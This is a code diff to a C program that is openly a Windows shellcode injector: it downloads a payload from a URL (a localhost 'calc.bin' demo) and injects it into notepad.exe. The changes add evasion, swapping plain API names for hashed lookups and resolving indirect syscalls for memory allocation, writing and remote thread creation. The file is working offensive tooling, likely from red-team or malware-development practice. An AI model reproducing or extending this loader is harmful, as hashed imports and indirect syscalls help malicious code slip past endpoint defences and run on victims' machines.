@@ -5,10 +5,14 @@
 #include "Common.h"
 #include "Debug.h"
 
-#define PAYLOAD L""
+#define PAYLOAD L"http://127.0.0.1:8000/calc.bin"
 #define PROC L"notepad.exe"
 
+extern API_HASHING g_Api;
 
+float _fltused = 0;
+
+#define DEBUG
 
 
 int main() {
@@ -19,22 +23,26 @@ int main() {
     HANDLE hProcess = NULL;
     HMODULE hNTDLL = NULL;
 
-    info("getting payload from url...")
+ 
+
+    PRINTA("getting payload from url...\n")
     if (!GetPayloadFromUrl(PAYLOAD, &pBytes, &sBytesSize)) {
         return -1;
     }
 
+    PRINTA("Starting Get Module...\n\n");
+    hNTDLL = GetMod(NTDLLDLL_DJB2);
+    g_Api.pOpenProcess = (fnOpenProcess)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), OpenProcess_JOAA);
+    indirectMyAss(NtAllocateVirtualMemory_DJB2, hNTDLL, &NtAllocateVirtualMemorySSN, &NtAllocateVirtualMemorySyscall);
+    indirectMyAss(NtCreateThreadEx_DJB2, hNTDLL, &NtCreateThreadSSN, &NtCreateThreadSyscall);
+    indirectMyAss(NtWriteVirtualMemory_DJB2, hNTDLL, &NtWriteVirtualMemorySSN, &NtWriteVirtualMemorySyscall);
+    indirectMyAss(NtWaitForSingleObject_DJB2, hNTDLL, &NtWaitForSingleObjectSSN, &NtWaitForSingleObjectSyscall);
+    indirectMyAss(NtClose_DJB2, hNTDLL, &NtCloseSSN, &NtCloseSyscall);
+    indirectMyAss(NtOpenProcess_DJB2, hNTDLL, &NtOpenProcessSSN, &NtOpenProcessSyscall);
+    indirectMyAss(NtQuerySystemInformation_DJB2, hNTDLL, &NtQuerySystemInformationSSN, &NtQuerySystemInformationSyscall);
 
-    hNTDLL = GetMod(L"NTDLL.DLL");
-    indirectMyAss("NtAllocateVirtualMemory", hNTDLL, &NtAllocateVirtualMemorySSN, &NtAllocateVirtualMemorySyscall);
-    indirectMyAss("NtCreateThreadEx", hNTDLL, &NtCreateThreadSSN, &NtCreateThreadSyscall);
-    indirectMyAss("NtWriteVirtualMemory", hNTDLL, &NtWriteVirtualMemorySSN, &NtWriteVirtualMemorySyscall);
-    indirectMyAss("NtWaitForSingleObject", hNTDLL, &NtWaitForSingleObjectSSN, &NtWaitForSingleObjectSyscall);
-    indirectMyAss("NtClose", hNTDLL, &NtCloseSSN, &NtCloseSyscall);
-    indirectMyAss("NtOpenProcess", hNTDLL, &NtOpenProcessSSN, &NtOpenProcessSyscall);
-    indirectMyAss("NtQuerySystemInformation", hNTDLL, &NtQuerySystemInformationSSN, &NtQuerySystemInformationSyscall);
 
-    info("running GetRemoteProcessHandle...\n\n");
+    PRINTA("running GetRemoteProcessHandle...\n\n");
     if (!GetRemoteProcessHandle(PROC, &PID, &hProcess)) {
         return -1;
     }
